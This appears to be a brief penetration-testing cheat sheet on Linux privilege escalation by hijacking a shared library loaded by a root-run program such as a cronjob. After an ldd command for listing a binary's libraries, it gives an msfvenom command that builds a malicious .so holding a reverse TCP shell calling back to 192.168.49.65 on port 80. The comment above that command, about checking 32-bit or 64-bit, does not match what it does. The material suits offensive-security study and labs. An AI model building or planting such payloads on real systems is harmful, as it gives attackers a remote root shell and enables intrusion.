# Privesc

### Shared Library

If you can control a library path that an application uses running as root like a cronjob then you can create a library with command execution.

```
#view shared libraries of a binary
ldd /path/to/binary
```

```
#check if its 32bit or 64bit
msfvenom --platform linux -f elf-so -p linux/x64/shell_reverse_tcp LHOST=192.168.49.65 LPORT=80 -o utils.so
```
